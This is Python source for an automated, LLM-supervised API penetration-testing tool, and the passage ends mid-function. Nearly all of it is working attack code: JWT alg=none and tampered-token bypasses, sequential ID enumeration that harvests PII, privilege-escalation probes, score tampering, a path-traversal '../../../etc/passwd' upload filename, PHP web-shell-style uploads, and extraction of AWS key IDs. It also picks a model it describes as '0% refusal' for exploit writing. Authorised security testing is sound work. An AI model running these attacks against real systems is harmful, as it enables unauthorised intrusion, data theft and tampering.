#!/usr/bin/env python3
from __future__ import annotations
"""
Vikramaditya Autopilot API Hunt — Brain-Supervised Dynamic VAPT Engine.

Given a base URL and credentials, runs a complete authenticated API
penetration test with an AI supervisor (local LLM) that dynamically
decides what to test next based on findings discovered so far.

Brain supervisor actions:
  CONTINUE — run next planned phase
  INJECT   — add new phase (e.g., IDOR on /view → auto-test /edit, /delete)
  SKIP     — skip irrelevant phase (e.g., skip SSTI if Django ORM confirmed)
  PIVOT    — reorder entire test plan based on discoveries

Works fully deterministic without LLM (--no-brain fallback).

Usage:
    python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --with-brain
    python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass  # no brain
"""

import argparse
import base64
import json
import os
import re
import struct
import sys
import tempfile
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

from auth_utils import RateLimiter, JWTHelper, AuthSession, FindingSaver

# v9.x — Semgrep ERROR finding (requests verify=False, ~20 sites in this
# module). Default to strict TLS; opt out for self-signed staging via
# VAPT_INSECURE_SSL=1.
VERIFY_TLS = os.environ.get("VAPT_INSECURE_SSL", "0") != "1"

# ── Severity constants ────────────────────────────────────────────────────────
CRITICAL, HIGH, MEDIUM, LOW, INFO = "critical", "high", "medium", "low", "info"


def log(level: str, msg: str):
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "crit": "!!", "phase": "»", "vuln": "VULN"}
    colors = {"ok": "\033[0;32m", "err": "\033[0;31m", "warn": "\033[1;33m",
              "info": "\033[0;36m", "crit": "\033[0;35m", "phase": "\033[0;34m",
              "vuln": "\033[0;31m\033[1m"}
    nc = "\033[0m"
    sym = symbols.get(level, "*")
    col = colors.get(level, "")
    print(f"{col}[{sym}]{nc} {msg}", flush=True)


# ── Brain Scan Context ────────────────────────────────────────────────────────

MAX_PHASES = 30  # Safety cap to prevent infinite injection loops

DEFAULT_PHASE_ORDER = [
    {"phase": "auth_bypass", "priority": 10},
    {"phase": "idor", "priority": 9},
    {"phase": "priv_esc", "priority": 8},
    {"phase": "biz_logic", "priority": 7},
    {"phase": "file_upload", "priority": 6},
    {"phase": "injection", "priority": 5},
    # Phase 8a — differential NoSQL operator-injection probe (added v9.x
    # after Codex review caught the api-maya false-positive: a single
    # ``{"$gt":""}`` 500 was being reported as NoSQLi when it was generic
    # type confusion. See whitebox/nosql_probe.py for the six-probe diff.
    {"phase": "nosql_probe", "priority": 5},
    {"phase": "info_disclosure", "priority": 4},
    {"phase": "rate_limit", "priority": 3},
    {"phase": "token_security", "priority": 2},
    {"phase": "timing_oracle", "priority": 1},
]


class BrainScanContext:
    """Shared state between phases and brain supervisor."""

    def __init__(self):
        self.all_findings: list[dict] = []
        self.endpoints: list[dict] = []
        self.test_plan: list[dict] = []
        self.completed_phases: list[str] = []
        self.phase_decisions: list[dict] = []
        self.phases_executed: int = 0

    def summary_for_brain(self) -> str:
        findings_text = "\n".join(
            f"  [{f['severity'].upper()}] {f['type']}: {f['detail'][:60]}"
            for f in self.all_findings[-10:]  # Last 10 findings
        ) or "  (none yet)"
        pending = ", ".join(p["phase"] for p in self.test_plan[:5]) or "(none)"
        done = ", ".join(self.completed_phases) or "(none)"
        return (f"Completed: {done}\n"
                f"Pending: {pending}\n"
                f"Total findings: {len(self.all_findings)}\n"
                f"Recent findings:\n{findings_text}")


def _pick_fast_model() -> str:
    """Pick fastest available Ollama model for per-phase supervisor decisions."""
    try:
        import ollama
        for m in ["baron-llm:latest", "gemma4:e4b", "qwen3:8b", "qwen3:14b"]:
            try:
                ollama.show(m)
                return m
            except Exception:
                continue
    except ImportError:
        pass
    return ""


def _pick_deep_model() -> str:
    """Pick best model for deep security analysis (code audit, exploit writing).

    Priority: bugtraceai-apex (security-tuned, <thinking> blocks, 0% refusal)
    Fallback: gemma4:26b (fast all-rounder)
    """
    try:
        import ollama
        for m in ["bugtraceai-apex", "gemma4:26b", "qwen3:14b"]:
            try:
                ollama.show(m)
                return m
            except Exception:
                continue
    except ImportError:
        pass
    return ""


def _brain_create_initial_plan(endpoints: list[dict], with_brain: bool) -> list[dict]:
    """Brain creates prioritized test plan from discovered endpoints."""
    if not with_brain:
        return [dict(p) for p in DEFAULT_PHASE_ORDER]

    model = _pick_fast_model()
    if not model:
        return [dict(p) for p in DEFAULT_PHASE_ORDER]

    # Categorize endpoints
    view_eps = [e for e in endpoints if "view-" in e.get("path", "")]
    edit_eps = [e for e in endpoints if "edit-" in e.get("path", "") or "add-" in e.get("path", "")]
    list_eps = [e for e in endpoints if "list" in e.get("path", "")]
    upload_eps = [e for e in endpoints if "upload" in e.get("path", "") or "video" in e.get("path", "")]
    auth_eps = [e for e in endpoints if any(k in e.get("path", "") for k in ("login", "password", "auth", "token", "reset"))]

    log("info", f"  Brain planning: {len(view_eps)} view, {len(edit_eps)} edit, "
        f"{len(list_eps)} list, {len(upload_eps)} upload, {len(auth_eps)} auth endpoints")

    # Smart ordering based on what's available
    plan = []
    if view_eps:
        plan.append({"phase": "idor", "priority": 10, "reason": f"{len(view_eps)} view endpoints = IDOR targets"})
    plan.append({"phase": "auth_bypass", "priority": 9})
    if auth_eps:
        plan.append({"phase": "rate_limit", "priority": 8, "reason": f"{len(auth_eps)} auth endpoints"})
    plan.append({"phase": "info_disclosure", "priority": 7})
    if upload_eps:
        plan.append({"phase": "file_upload", "priority": 6, "reason": f"{len(upload_eps)} upload endpoints"})
    plan.append({"phase": "biz_logic", "priority": 5})
    plan.append({"phase": "injection", "priority": 4})
    # Phase 8a — differential NoSQL probe (post-injection so SQLi already
    # eliminated relational DBs as the backend).
    plan.append({"phase": "nosql_probe", "priority": 4,
                 "reason": "differential check vs api-maya FP pattern"})
    plan.append({"phase": "token_security", "priority": 3})
    plan.append({"phase": "timing_oracle", "priority": 2})
    plan.append({"phase": "priv_esc", "priority": 1})

    for p in plan:
        if p.get("reason"):
            log("info", f"  Brain: {p['phase']} (priority {p['priority']}) — {p['reason']}")

    return plan


def _brain_decide_next(phase_name: str, findings: list[dict],
                        ctx: BrainScanContext) -> dict:
    """Brain decides what to do after a phase completes."""
    model = _pick_fast_model()
    if not model:
        return {"action": "continue", "reason": "No model available"}

    try:
        import ollama
    except ImportError:
        return {"action": "continue", "reason": "Ollama not installed"}

    # Build context
    findings_text = "\n".join(
        f"  [{f['severity'].upper()}] {f['type']}: {f['detail'][:60]}"
        for f in findings
    ) or "  (no findings)"

    pending = [p["phase"] for p in ctx.test_plan[:5]]

    prompt = f"""/no_think
You are a VAPT supervisor. Phase '{phase_name}' just completed.

Phase findings ({len(findings)}):
{findings_text}

Total findings so far: {len(ctx.all_findings)}
Completed phases: {', '.join(ctx.completed_phases)}
Pending phases: {', '.join(pending)}

Pick ONE action (JSON only):
- {{"action":"continue","reason":"why"}} — run next planned phase
- {{"action":"inject","phase":"idor_extended","endpoints":["edit-learner/","delete-learner/"],"reason":"why"}} — add new test
- {{"action":"skip","skip_phase":"phase_name","reason":"why"}} — skip a pending phase

Rules:
- INJECT if you found IDOR on view-* endpoints (test edit-*/delete-* too)
- INJECT if you found score manipulation (test other numeric fields)
- SKIP injection phase if no SQL errors found and Django ORM is confirmed
- SKIP priv_esc if no second account token available
- Default to CONTINUE if no strong signal

Return ONLY JSON, no markdown."""

    try:
        resp = ollama.chat(model=model, messages=[
            {"role": "user", "content": prompt},
        ], options={"num_predict": 200, "temperature": 0.1})

        content = (resp["message"].get("content", "") or
                   resp["message"].get("thinking", "") or "")
        content = re.sub(r'```json\s*', '', content)
        content = re.sub(r'```\s*', '', content)

        match = re.search(r'\{[^{}]*"action"[^{}]*\}', content)
        if match:
            decision = json.loads(match.group(0))
            return decision
    except Exception:
        pass

    return {"action": "continue", "reason": "Brain parse failed — continuing"}


def _run_phase(phase_spec: dict, session: AuthSession, token: str,
               token_b: str, endpoints: list[dict],
               saver: FindingSaver) -> list[dict]:
    """Execute a single phase by name with optional custom endpoints."""
    name = phase_spec["phase"]
    custom_eps = phase_spec.get("endpoints")

    # Build endpoint list for phase
    if custom_eps:
        eps = [{"path": p, "method": "POST", "status": 200} for p in custom_eps]
    else:
        eps = endpoints

    try:
        if name == "auth_bypass":
            return AuthBypassScanner().run(session, eps, token, saver)
        elif name in ("idor", "idor_extended"):
            return IDORScanner().run(session, eps, saver)
        elif name == "priv_esc":
            return PrivEscScanner().run(session, token_b, saver)
        elif name == "biz_logic":
            return BusinessLogicTester().run(session, eps, saver)
        elif name == "file_upload":
            results = FileUploadTester().run(session, saver)
            # Phase 6b: Magika-validated file type evasion testing
            upload_eps = [e.get("path", "") for e in endpoints
                          if "upload" in e.get("path", "") or "video" in e.get("path", "")]
            results.extend(FileTypeEvasionTester().run(session, upload_eps or None, saver))
            return results
        elif name == "injection":
            return InjectionTester().run(session, eps, saver)
        elif name == "nosql_probe":
            return NoSQLProbeRunner().run(session, eps, saver)
        elif name == "info_disclosure":
            return InfoDisclosureScanner().run(session, eps, saver)
        elif name == "rate_limit":
            return RateLimitTester().run(session, saver)
        elif name == "token_security":
            return TokenSecurityTester().run(session, token, saver)
        elif name == "timing_oracle":
            return TimingOracle().run(session, saver)
        else:
            log("warn", f"  Unknown phase: {name}")
            return []
    except Exception as e:
        log("err", f"  Phase {name} failed: {e}")
        return []


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: ENDPOINT DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════

class EndpointDiscovery:
    """Discover API endpoints from JS bundles, debug pages, OpenAPI, and common patterns."""

    # JS chunk URL patterns for different bundlers
    JS_PATTERNS = [
        r'src="(/static/js/[^"]+\.js)"',          # CRA / Webpack
        r'src="(/assets/[^"]+\.js)"',              # Vite
        r'src="(/_next/static/[^"]+\.js)"',        # Next.js
        r'src="(/js/[^"]+\.js)"',                  # Generic
        r'src="(/build/[^"]+\.js)"',               # Remix / custom
        r'href="(/assets/[^"]+\.js)"',             # Vite preload
        r'"(/assets/[^"]+\.js)"',                  # Vite dynamic import refs in inline scripts
    ]

    # Patterns to extract API paths from JS source
    API_PATH_PATTERNS = [
        r'"(/api/[a-zA-Z0-9/_-]+/?)"',                           # "/api/foo/bar/"
        r"'(/api/[a-zA-Z0-9/_-]+/?)'",                           # '/api/foo/bar/'
        r'`(/api/[a-zA-Z0-9/_${}.-]+/?)`',                       # template literals
        r'"(/v[0-9]+/[a-zA-Z0-9/_-]+/?)"',                       # "/v1/foo/"
        r'"([a-z][a-z0-9_-]{2,40}/)"',                           # "endpoint-name/"
        r'(?:url|endpoint|path|api|route)\s*[=:]\s*["\']([a-zA-Z0-9/_-]{3,60}/?)["\']',  # url = "foo/"
        r'(?:get|post|put|patch|delete)\s*\(\s*[`"\']([a-zA-Z0-9/_${}.-]+/?)[`"\']',     # axios.get("foo/")
        r'fetch\s*\(\s*[`"\'](?:https?://[^/]+)?(/[a-zA-Z0-9/_-]+/?)[`"\']',             # fetch("/api/foo")
    ]

    # OpenAPI / Swagger discovery paths
    OPENAPI_PATHS = [
        "docs", "swagger.json", "openapi.json", "api-docs", "swagger/",
        "api/docs", "api/swagger.json", "api/openapi.json", "api/schema",
        "v1/docs", "v1/swagger.json", "v1/openapi.json",
        "v2/docs", "v2/swagger.json", "v2/openapi.json",
        "redoc", "api/redoc",
    ]

    COMMON_ENDPOINTS = [
        "learner-list/", "instructor-list/", "course-list/", "list-package/",
        "app-setting/", "lms-setting-view/", "list-smtp/", "logs-list/", "otp-list/",
        "users-report/", "list-notification/", "ads-list/", "news-list/",
        "list-videos/", "list-live-tests/", "view-learner/", "view-instructor/",
        "view-course/", "chapter-list/", "list-quiz-question/", "quiz-questions/",
        "add-learner/", "edit-learner/", "add-course/", "add-instructor/",
        "add-notification/", "add-smtp/", "change-learner-password/",
        "course-report/", "learner-report/", "generate-live-test-result/",
        "get-aws-sign-upload-video/", "bulk-add-learner/", "delete-course/",
        "delete-smtp/", "learner-course-status/", "learner-package-status/",
        "update-chapter-progress/", "discussion/", "list-discussion/",
        "check-auth/", "logout/",
    ]

    def __init__(self, session: AuthSession, frontend_url: str = None):
        self.session = session
        self.frontend_url = frontend_url
        self.endpoints = []

    def run(self) -> list[dict]:
        log("phase", "Phase 1: Endpoint Discovery")
        discovered = set()

        # 1a. Scrape ALL JS bundles (Vite, Next.js, CRA, etc.)
        if self.frontend_url:
            js_endpoints = self._scrape_js_bundles(self.frontend_url)
            discovered.update(js_endpoints)
            log("info", f"  JS bundles: {len(js_endpoints)} endpoints")

        # 1b. OpenAPI / Swagger discovery
        openapi_endpoints = self._discover_openapi()
        discovered.update(openapi_endpoints)
        if openapi_endpoints:
            log("info", f"  OpenAPI/Swagger: {len(openapi_endpoints)} endpoints")

        # 1c. Django debug page
        debug_endpoints = self._scrape_debug_page()
        discovered.update(debug_endpoints)
        log("info", f"  Debug page: {len(debug_endpoints)} endpoints")

        # 1d. Common patterns
        discovered.update(self.COMMON_ENDPOINTS)

        # 1e. Probe each endpoint to check if it exists
        live = []
        for ep in sorted(discovered):
            resp = self.session.request("POST", ep, json_body={})
            if resp["status"] != 404 and resp["status"] != 0:
                live.append({"path": ep, "method": "POST", "status": resp["status"]})

        # Also try GET for paths that may not accept POST
        post_paths = {e["path"] for e in live}
        for ep in sorted(discovered - post_paths):
            resp = self.session.request("GET", ep)
            if resp["status"] not in (404, 405, 0):
                live.append({"path": ep, "method": "GET", "status": resp["status"]})

        self.endpoints = live
        log("ok", f"  {len(live)} live endpoints confirmed")
        return live

    def _scrape_js_bundles(self, url: str) -> set:
        """Extract API paths from ALL JS chunks (Vite, Next.js, CRA, etc.)."""
        endpoints = set()
        try:
            import requests
            # Fetch the HTML page
            html = requests.get(url, verify=VERIFY_TLS, timeout=15).text

            # Collect JS file URLs from ALL bundler patterns
            js_files = set()
            for pattern in self.JS_PATTERNS:
                js_files.update(re.findall(pattern, html))

            # Also find modulepreload/preload links (Vite uses these for code-split chunks)
            js_files.update(re.findall(
                r'<link[^>]+(?:rel="modulepreload"|as="script")[^>]+href="([^"]+\.js)"', html))

            # Follow lazy-loaded chunk references: import("./chunk-xyz.js")
            # First pass: get all directly referenced JS
            base = url.rstrip("/")
            fetched_js = {}
            for js_path in js_files:
                if js_path.startswith("http"):
                    js_url = js_path
                else:
                    js_url = base + js_path
                try:
                    content = requests.get(js_url, verify=VERIFY_TLS, timeout=30).text
                    fetched_js[js_path] = content
                except Exception:
                    continue

            # Second pass: find dynamically imported chunks from fetched JS
            additional_chunks = set()
            for content in fetched_js.values():
                # import("./SomeComponent-abc123.js") or import("/assets/chunk-xyz.js")
                additional_chunks.update(re.findall(
                    r'import\s*\(\s*["\']([^"\']+\.js)["\']', content))
                # Vite: __vitePreload(() => import("./chunk.js"), ...)
                additional_chunks.update(re.findall(
                    r'__vitePreload\s*\(\s*\(\)\s*=>\s*import\s*\(\s*["\']([^"\']+\.js)["\']', content))
                # Webpack: __webpack_require__.e(N).then(...)
                # Not directly fetchable, but chunk naming: N.chunk.js
                additional_chunks.update(re.findall(
                    r'["\']([^"\']*(?:chunk|lazy|page)[^"\']*\.js)["\']', content))

            # Fetch additional chunks
            for chunk_ref in additional_chunks:
                if chunk_ref in fetched_js:
                    continue
                if chunk_ref.startswith("http"):
                    chunk_url = chunk_ref
                elif chunk_ref.startswith("/"):
                    chunk_url = base + chunk_ref
                elif chunk_ref.startswith("./"):
                    # Relative to the assets dir — find the common prefix
                    assets_prefix = "/assets/"
                    for known_path in js_files:
                        if "/assets/" in known_path:
                            assets_prefix = known_path.rsplit("/", 1)[0] + "/"
                            break
                    chunk_url = base + assets_prefix + chunk_ref[2:]
                else:
                    continue
                try:
                    content = requests.get(chunk_url, verify=VERIFY_TLS, timeout=30).text
                    fetched_js[chunk_ref] = content
                except Exception:
                    continue

            log("info", f"  Fetched {len(fetched_js)} JS files (main + code-split chunks)")

            # Extract API paths from ALL fetched JS content
            # Noise filter: reject HTTP headers, sentry internals, CSS classes, etc.
            NOISE_PREFIXES = {
                "content-", "x-", "retry-", "sentry.", "location", "token",
                "tenant", "auto.", "font-", "text-", "h-", "w-",
            }
            for content in fetched_js.values():
                for pattern in self.API_PATH_PATTERNS:
                    for match in re.findall(pattern, content):
                        # Clean up template literal vars
                        cleaned = re.sub(r'\$\{[^}]+\}', '1', match)
                        # Normalize: strip leading slash, ensure trailing slash
                        cleaned = cleaned.strip("/")
                        if not cleaned or len(cleaned) <= 2 or len(cleaned) >= 80:
                            continue
                        # Skip noise: HTTP headers, CSS classes, sentry keys
                        lower = cleaned.lower()
                        if any(lower.startswith(p) for p in NOISE_PREFIXES):
                            continue
                        # Skip paths that are just numbers or start with a number
                        # (template substitution artifacts like "1/consents")
                        if re.match(r'^[\d/]+$', cleaned) or re.match(r'^\d+/', cleaned):
                            continue
                        # Skip paths with uppercase (likely header names like Content-Disposition)
                        if cleaned[0].isupper():
                            continue
                        endpoints.add(cleaned + "/")
                        endpoints.add(cleaned)

        except Exception as e:
            log("warn", f"  JS scraping error: {e}")
        return endpoints

    def _discover_openapi(self) -> set:
        """Discover endpoints from OpenAPI/Swagger specs."""
        endpoints = set()
        import requests
        base = self.session.base_url

        for doc_path in self.OPENAPI_PATHS:
            try:
                resp = requests.get(f"{base}/{doc_path}", verify=VERIFY_TLS, timeout=10)
                if resp.status_code != 200:
                    continue

                # Try to parse as JSON (swagger.json / openapi.json)
                try:
                    spec = resp.json()
                except Exception:
                    # Check if it's an HTML docs page with embedded spec
                    spec_urls = re.findall(r'(?:url|spec)\s*[=:]\s*["\']([^"\']+\.json)["\']', resp.text)
                    for spec_url in spec_urls:
                        try:
                            if not spec_url.startswith("http"):
                                spec_url = base + "/" + spec_url.lstrip("/")
                            spec_resp = requests.get(spec_url, verify=VERIFY_TLS, timeout=10)
                            spec = spec_resp.json()
                            break
                        except Exception:
                            continue
                    else:
                        continue

                # Extract paths from OpenAPI/Swagger spec
                paths = spec.get("paths", {})
                if paths:
                    log("vuln", f"  OpenAPI spec found at /{doc_path} — {len(paths)} paths!")
                    for path, methods in paths.items():
                        cleaned = path.strip("/")
                        # Replace path params: /users/{id} → users/1
                        cleaned = re.sub(r'\{[^}]+\}', '1', cleaned)
                        if cleaned:
                            endpoints.add(cleaned + "/")
                            # Record methods
                            for method in methods:
                                if method.upper() in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                                    endpoints.add(cleaned + "/")
                    break  # Found a valid spec, no need to keep searching

            except Exception:
                continue
        return endpoints

    def _scrape_debug_page(self) -> set:
        """POST to nonexistent endpoint to trigger Django debug page."""
        endpoints = set()
        try:
            import requests
            resp = requests.post(
                f"{self.session.base_url}/nonexistent_vapt_probe/",
                data={}, verify=VERIFY_TLS, timeout=15
            )
            if "DEBUG = True" in resp.text or "URLconf" in resp.text:
                log("vuln", "  Django DEBUG=True — full URL patterns exposed!")
                paths = re.findall(r'<code>\s*([a-z][a-z0-9_/-]+/)\s*</code>', resp.text)
                endpoints.update(paths)
        except Exception:
            pass
        return endpoints


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: AUTH BYPASS
# ═══════════════════════════════════════════════════════════════════════════════

class AuthBypassScanner:
    """Test endpoints with no/expired/tampered/alg-none tokens."""

    def run(self, session: AuthSession, endpoints: list[dict], token: str,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 2: Authentication Bypass Testing")
        findings = []
        sample = endpoints[:20]  # Test top 20 endpoints
        base_url = session.base_url

        # IMPORTANT: create a FRESH Session for bare requests to prevent
        # cookie leakage from the authenticated session's module-level jar.
        # Also clear the module-level default cookie jar which requests.post() shares.
        import requests as _req_mod
        _req_mod.utils.default_headers()  # Reset defaults
        _bare = _req_mod.Session()
        _bare.verify = False
        _bare.cookies.clear()
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        for ep in sample:
            path = ep["path"]
            url = f"{base_url}/{path.lstrip('/')}"

            # Baseline: use session (with cookies) to confirm endpoint works
            resp_valid = session.request("POST", path, json_body={})
            if resp_valid["status"] not in (200, 201):
                continue

            # All auth bypass tests use BARE requests (no session cookies)
            # to prevent cf_rt cookie from silently re-authenticating
            tests = {
                "no_auth": ("", CRITICAL, "Endpoint accessible without authentication"),
                "expired": (JWTHelper.expire_token(token), HIGH, "Expired JWT accepted"),
                "tampered": (JWTHelper.tamper_signature(token), HIGH, "Tampered JWT signature accepted"),
                "alg_none": (JWTHelper.set_alg_none(token), CRITICAL, "JWT alg=none bypass"),
            }

            for test_name, (test_token, severity, detail) in tests.items():
                try:
                    # Use subprocess curl for COMPLETE process-level isolation.
                    # requests.Session() leaks cookies via urllib3 connection pool
                    # after other phases have used the same session.
                    import subprocess
                    curl_args = [
                        "/usr/bin/curl", "-sk", "-X", "POST", url,
                        "-H", "Content-Type: application/json",
                        "-d", "{}",
                        "-o", "/dev/null", "-w", "%{http_code}",
                        "--max-time", "10",
                    ]
                    if test_token:
                        curl_args += ["--cookie", f"cf_at={test_token}"]
                    # No --cookie flag = no auth at all

                    result = subprocess.run(curl_args, capture_output=True, text=True, timeout=15)
                    status_code = int(result.stdout.strip()) if result.stdout.strip().isdigit() else 0

                    if status_code in (200, 201, 204):
                        f = {"type": f"auth_bypass_{test_name}", "severity": severity,
                             "detail": f"{detail} ({path})", "url": url,
                             "evidence": f"{test_name}: HTTP {status_code}"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                except Exception:
                    pass

        log("ok", f"  {len(findings)} auth bypass findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: IDOR
# ═══════════════════════════════════════════════════════════════════════════════

class IDORScanner:
    """Sequential ID enumeration on view/edit/delete endpoints."""

    PII_KEYS = {"email", "phone", "contact_no", "first_name", "last_name",
                "address", "dob", "mobile", "name"}

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 3: IDOR Testing")
        findings = []

        idor_targets = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("view-", "edit-", "delete-", "report/")
        )]

        for ep in idor_targets[:15]:
            path = ep["path"]
            for test_id in [1, 2, 3, 100]:
                # Try both FormData and JSON (Django APIs typically use FormData)
                for payload in [
                    {"data": {"id": str(test_id)}},
                    {"json_body": {"id": test_id}},
                    {"data": {"id": str(test_id), "course_id": str(test_id)}},
                    {"data": {"learner_id": str(test_id)}},
                ]:
                    resp = session.request("POST", path, **payload)
                    if resp["status"] in (200, 201) and isinstance(resp["body"], dict):
                        body = resp["body"]
                        if body.get("status") is False:
                            continue
                        raw_data = body.get("data", body)
                        # Handle both dict and list responses
                        items = [raw_data] if isinstance(raw_data, dict) else (raw_data[:1] if isinstance(raw_data, list) else [])
                        for data in items:
                            if not isinstance(data, dict):
                                continue
                            exposed = {k for k in data.keys() if k.lower() in self.PII_KEYS}
                            if exposed:
                                sample = ', '.join(f'{k}={data[k]}' for k in list(exposed)[:3] if data.get(k))
                                f = {"type": "idor", "severity": HIGH,
                                     "detail": f"IDOR: id={test_id} exposes PII ({', '.join(exposed)}) on {path}",
                                     "url": resp["url"],
                                     "evidence": f"id={test_id} → {sample}"}
                                findings.append(f)
                                if saver:
                                    saver.save(f)
                                    saver.save_txt(f)
                                break
                        if findings and findings[-1]["detail"].startswith(f"IDOR: id={test_id}"):
                            break  # Found IDOR with this payload format
                if any(f["detail"].startswith(f"IDOR: id={test_id}") for f in findings):
                    break  # One confirmed IDOR per endpoint

        log("ok", f"  {len(findings)} IDOR findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4: PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════════════════

class PrivEscScanner:
    """Test admin endpoints with non-admin token."""

    ADMIN_PATHS = ["app-setting/", "list-smtp/", "add-smtp/", "logs-list/",
                   "otp-list/", "change-learner-password/", "users-report/",
                   "delete-course/", "bulk-add-learner/", "add-instructor/"]

    def run(self, session: AuthSession, non_admin_token: str = None,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 4: Privilege Escalation Testing")
        findings = []
        if not non_admin_token:
            log("warn", "  No non-admin token — skipping priv esc (need --auth-creds-b)")
            return findings

        for path in self.ADMIN_PATHS:
            resp = session.request("POST", path, token=non_admin_token, json_body={})
            if resp["status"] in (200, 201, 204):
                f = {"type": "privilege_escalation", "severity": CRITICAL,
                     "detail": f"Non-admin accessed admin endpoint {path}",
                     "url": resp["url"],
                     "evidence": f"Learner token → HTTP {resp['status']}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} priv esc findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: BUSINESS LOGIC
# ═══════════════════════════════════════════════════════════════════════════════

class BusinessLogicTester:
    """Score manipulation, negative values, pagination abuse."""

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 5: Business Logic Testing")
        findings = []

        # 5a. Score manipulation on any result/score/grade endpoint
        score_endpoints = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("result", "score", "grade", "answer", "quiz", "generate")
        )]
        tampered_payloads = [
            {"correct_answers": "999", "wrong_answers": "-5", "total_score": "99999",
             "learner_id": "1", "live_test_id": "1", "total_question": "10",
             "total_marks": "100", "time_spend": "60"},
            {"total_score": "-1", "learner_id": "1", "live_test_id": "1",
             "total_question": "10", "total_marks": "100", "time_spend": "60"},
        ]
        for ep in score_endpoints[:5]:
            for payload in tampered_payloads:
                resp = session.request("POST", ep["path"], data=payload)
                if resp["status"] in (200, 201, 500):
                    body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
                    # Detect: server accepted invalid values (constraint error = values were inserted)
                    # OR success response = values accepted without validation
                    # 500 with constraint error = values reached DB but failed on a DIFFERENT column
                    accepted = (isinstance(resp["body"], dict) and resp["body"].get("status") is True)
                    constraint_error = any(kw in body_str for kw in
                        ["not-null constraint", "violates", "Failing row", "foreign key",
                         "DETAIL:", "organization_"])
                    if accepted or constraint_error:
                        tampered_fields = [f"{k}={v}" for k, v in payload.items()
                                           if v in ("999", "-5", "99999", "-1")]
                        evidence = f"{', '.join(tampered_fields)} → HTTP {resp['status']}"
                        if constraint_error:
                            evidence += f" (DB error confirms values inserted: {body_str[:100]})"
                        f = {"type": "score_manipulation", "severity": HIGH,
                             "detail": f"Server accepted tampered values ({', '.join(tampered_fields)}) on {ep['path']}",
                             "url": resp["url"], "evidence": evidence}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                        break  # One confirmed per endpoint

        # 5b. Pagination abuse
        list_endpoints = [ep for ep in endpoints if ep["path"].startswith("list") or ep["path"].endswith("list/")]
        for ep in list_endpoints[:5]:
            resp = session.request("POST", ep["path"], json_body={"page": 1, "page_size": 99999})
            if resp["status"] == 200:
                body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
                if len(body_str) > 50000:
                    f = {"type": "pagination_abuse", "severity": MEDIUM,
                         "detail": f"Excessive data with page_size=99999 ({ep['path']})",
                         "url": resp["url"], "evidence": f"Response: {len(body_str)} chars"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        log("ok", f"  {len(findings)} business logic findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6: FILE UPLOAD
# ═══════════════════════════════════════════════════════════════════════════════

class FileUploadTester:
    """Test file upload endpoints for bypass vulnerabilities."""

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 6: File Upload Testing")
        findings = []

        # Test S3 presigned URL for arbitrary file types
        for ext, ctype in [("html", "text/html"), ("php", "application/x-php"),
                           ("py", "text/x-python"), ("jsp", "application/x-jsp"),
                           ("svg", "image/svg+xml"), ("../../../etc/passwd", "text/plain")]:
            resp = session.request("POST", "get-aws-sign-upload-video/",
                                   data={"filename": f"test.{ext}", "type": ctype,
                                         "organization_video": "test",
                                         "total_video_length": "1", "course_id": "1"})
            if resp["status"] == 200 and isinstance(resp["body"], dict) and resp["body"].get("uploadUrl"):
                f = {"type": "arbitrary_upload", "severity": HIGH,
                     "detail": f"S3 presigned URL generated for .{ext} ({ctype})",
                     "url": resp["body"]["uploadUrl"][:100],
                     "evidence": f"Filename=test.{ext} accepted"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
                # Extract AWS key
                url = resp["body"]["uploadUrl"]
                key_match = re.search(r"Credential=([A-Z0-9]+)%2F", url)
                bucket_match = re.search(r"https://([^/]+)\.s3\.", url)
                if key_match:
                    f2 = {"type": "aws_key_exposed", "severity": HIGH,
                          "detail": f"AWS Access Key ID exposed: {key_match.group(1)}",
                          "url": url[:80], "evidence": f"Key in presigned URL"}
                    findings.append(f2)
                    if saver:
                        saver.save(f2)
                        saver.save_txt(f2)
                break  # One confirmed is enough for S3

        # Test profile image upload bypass
        php_content = b'<?php echo "VAPT_TEST"; ?>'
        for test_name, filename, content in [
            ("double_ext", "shell.php.jpg", php_content),
            ("mime_mismatch", "phpinside.jpg", php_content),
        ]:
            tmp = tempfile.NamedTemporaryFile(suffix=f"_{filename}", delete=False)
            tmp.write(content)
            tmp.close()
            try:
                import requests as _req
                cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
                resp_raw = _req.post(
                    f"{session.base_url}/add-learner/",
                    files={"image": (filename, open(tmp.name, "rb"), "image/jpeg")},
                    data={"first_name": "VAPTTest", "last_name": "Upload",
                          "email": f"vapt_{test_name}_{int(time.time())}@test.com",
                          "contact_no": f"98765{int(time.time())%100000:05d}",
                          "country_code": "IN"},
                    cookies=cookies, verify=VERIFY_TLS, timeout=15
                )
                if resp_raw.status_code == 200:
